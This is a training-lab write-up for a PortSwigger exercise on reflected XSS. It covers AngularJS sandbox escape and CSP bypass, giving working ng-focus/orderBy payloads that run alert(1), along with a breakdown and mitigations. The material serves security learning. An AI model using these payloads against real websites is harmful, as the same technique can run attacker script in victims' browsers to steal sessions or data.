# Lab25 - Reflected XSS With AngularJS Sandbox Escape And CSP Bypass

## Objective

Exploit a CSTI vulnerability despite:

```text
AngularJS Sandbox
+
Content Security Policy (CSP)
```

Execute:

```javascript
alert(1)
```

to solve the lab.

---

# Lab Information

| Field | Value |
|---------|---------|
| Category | CSTI |
| Difficulty | Expert |
| Framework | AngularJS |
| Vulnerability | Sandbox Escape + CSP Bypass |
| Platform | PortSwigger |

---

# Vulnerability Overview

The application:

```text
Uses AngularJS
Uses CSP
Evaluates User Input
```

Traditional AngularJS payloads fail because CSP blocks dangerous functions.

---

# Analysis

## Step 1

Verify AngularJS

Payload:

```html
{{7*7}}
```

---

Result:

```text
49
```

---

Confirmed:

```text
AngularJS Expression Evaluation
```

---

## Step 2

Inspect CSP

Response headers contain:

```text
Content-Security-Policy
```

---

Traditional payloads fail.

---

## Step 3

Need Alternative Execution Path

AngularJS provides:

```javascript
$event
```

inside event handlers.

---

Chrome exposes:

```javascript
$event.path
```

which eventually contains:

```javascript
window
```

---

## Step 4

Trigger Angular Event

Use:

```html
ng-focus
```

with:

```html
autofocus
```

for automatic execution.

---

# Full Payload(s) Used

```html
<input id=x ng-focus=$event.path|orderBy:'[].constructor.from([1],alert)' autofocus>
```

---

# Alternative Modern Browser Payload

```html
<input id=x ng-focus=$event.composedPath()|orderBy:'[].constructor.from([1],alert)' autofocus>
```

---

# Payload Breakdown

## autofocus

Automatically focuses element.

---

## ng-focus

Executes AngularJS expression.

---

## $event.path

Provides path containing:

```javascript
window
```

---

## orderBy

Evaluates supplied expression.

---

## [].constructor.from()

Executes:

```javascript
alert(1)
```

without requiring blocked functionality.

---

# Why The Payload Works

Execution Flow:

```text
Page Loads
        ↓
autofocus Triggers
        ↓
ng-focus Executes
        ↓
$event.path Accessed
        ↓
orderBy Evaluates Payload
        ↓
alert(1)
```

---

# Personal Analysis & Testing Process

## Initial Goal

Verify CSTI.

---

Used:

```html
{{7*7}}
```

---

Confirmed AngularJS.

---

## Problem

CSP blocks traditional sandbox escapes.

---

## Key Observation

AngularJS events expose:

```javascript
$event
```

objects.

---

## Exploitation Strategy

Use:

```javascript
$event.path
```

to reach useful objects.

Execute through:

```javascript
orderBy
```

instead of blocked functions.

---

## Result

```javascript
alert(1)
```

executed despite CSP.

Lab solved.

---

# Mitigation

Upgrade AngularJS.

Disable expression evaluation for user input.

Use strict CSP and remove AngularJS event-based execution paths.

---

# Related Theory

- 31-angularjs-sandbox.md
- 32-angularjs-sandbox-escape.md
- 33-angularjs-csp-bypass.md

---

# Key Learnings

- CSP is not always sufficient.
- AngularJS events expose powerful objects.
- orderBy can become an execution sink.
- Legacy AngularJS applications remain high-value bug bounty targets.